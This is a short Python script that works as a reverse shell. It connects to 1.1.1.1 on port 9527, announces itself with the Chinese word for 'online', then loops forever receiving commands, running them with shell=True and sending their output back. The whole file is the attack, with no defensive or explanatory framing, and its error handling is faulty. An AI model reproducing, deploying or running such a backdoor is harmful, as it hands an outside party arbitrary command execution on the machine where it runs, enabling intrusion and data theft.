import socket
import subprocess


def run_command(command):
    command = command.rstrip()
    try:
        child = subprocess.run(command,shell=True,stdout=subprocess.PIPE)


    except:
        child = 'can not execute the cmd'
    return child


s = socket.socket()
s.connect(("1.1.1.1", 9527))
msg = '上线了'
s.send(msg.encode())
while True:

    cmd = s.recv(1024)
    # print(data.decode())
    output = run_command(cmd.decode())
    s.send(output.stdout)

s.close()
